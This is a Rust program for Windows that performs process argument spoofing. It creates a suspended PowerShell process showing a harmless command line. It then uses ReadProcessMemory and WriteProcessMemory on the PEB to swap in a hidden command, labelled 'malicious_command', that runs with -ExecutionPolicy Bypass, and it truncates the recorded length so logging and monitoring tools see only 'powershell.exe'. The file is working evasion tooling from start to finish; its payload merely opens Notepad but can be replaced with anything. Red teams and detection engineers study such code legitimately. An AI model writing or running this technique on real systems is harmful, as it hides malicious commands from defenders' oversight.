use std::mem::{size_of, zeroed};

use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::{CloseHandle, NTSTATUS, HANDLE};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{
    CreateProcessW, ResumeThread, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
    PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW,
};

#[link(name = "ntdll")]
extern "system" {
    fn NtQueryInformationProcess(
        ProcessHandle: HANDLE,
        ProcessInformationClass: u32,
        ProcessInformation: *mut std::ffi::c_void,
        ProcessInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> NTSTATUS;
}

#[repr(C)]
struct CustomPeb {
    _filler: [u8; 16],
    image_base_address: *mut std::ffi::c_void,
    ldr: *mut std::ffi::c_void,
    process_parameters: *mut CustomRtlUserProcessParameters,
}

#[repr(C)]
struct CustomRtlUserProcessParameters {
    _filler: [u8; 112],
    length: u16,
    maximum_length: u16,
    command_line: PWSTR,
}

fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide: Vec<u16> = s.encode_utf16().collect();
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}

fn main() {
    let malicious_command = "powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";
    let malicious_command_wide: Vec<u16> = malicious_command.encode_utf16().collect();

    let spoofed_command_str = "powershell.exe";
    let mut spoofed_command_wide = pad_right(spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0); // Null terminate for CreateProcessW

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as u32;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let mut current_dir: Vec<u16> = "C:\\windows\\".encode_utf16().collect();
    current_dir.push(0); // Null terminate

    let success = unsafe {
        CreateProcessW(
            None,
            PWSTR(spoofed_command_wide.as_mut_ptr()),
            Some(&sa),
            Some(&sa),
            false,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            None,
            PCWSTR(current_dir.as_ptr()),
            &si,
            &mut pi,
        )
    };

    if success.is_err() {
        println!("CreateProcessW failed: {:?}", success.err());
        return;
    }

    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let status = unsafe {
        NtQueryInformationProcess(
            pi.hProcess,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut std::ffi::c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        )
    };

    if status != NTSTATUS(0) {
        println!("NtQueryInformationProcess failed with status: {:?}", status);
        unsafe {
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
        return;
    }

    let mut peb: CustomPeb = unsafe { zeroed() };
    let mut bytes_read: usize = 0;
    let success = unsafe {
        ReadProcessMemory(
            pi.hProcess,
            pbi.PebBaseAddress as *const _,
            &mut peb as *mut _ as *mut _,
            size_of::<CustomPeb>(),
            Some(&mut bytes_read as *mut _),
        )
    };

    if success.is_err() || bytes_read != size_of::<CustomPeb>() {
        println!("ReadProcessMemory for PEB failed: {:?}", success.err());
        unsafe {
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
        return;
    }

    let mut proc_params: CustomRtlUserProcessParameters = unsafe { zeroed() };
    let success = unsafe {
        ReadProcessMemory(
            pi.hProcess,
            peb.process_parameters as *const _,
            &mut proc_params as *mut _ as *mut _,
            size_of::<CustomRtlUserProcessParameters>(),
            Some(&mut bytes_read as *mut _),
        )
    };

    if success.is_err() || bytes_read != size_of::<CustomRtlUserProcessParameters>() {
        println!("ReadProcessMemory for ProcessParameters failed: {:?}", success.err());
        unsafe {
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
        return;
    }

    let mut bytes_written: usize = 0;
    let success = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            proc_params.command_line.as_ptr() as _,
            malicious_command_wide.as_ptr() as _,
            malicious_command_wide.len() * 2, // size in bytes
            Some(&mut bytes_written as *mut _),
        )
    };

    if success.is_err() {
        println!("WriteProcessMemory for command line failed: {:?}", success.err());
        unsafe {
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16; // Length in bytes
    let success = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            (peb.process_parameters as *mut u8).add(112) as _,
            &cmd_line_len as *const _ as _,
            size_of::<u16>(),
            Some(&mut bytes_written as *mut _),
        )
    };

    if success.is_err() {
        println!("WriteProcessMemory for command line length failed: {:?}", success.err());
        unsafe {
            let _ = CloseHandle(pi.hProcess);
            let _ = CloseHandle(pi.hThread);
        }
        return;
    }

    unsafe {
        let _ = ResumeThread(pi.hThread);
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);
    }
}
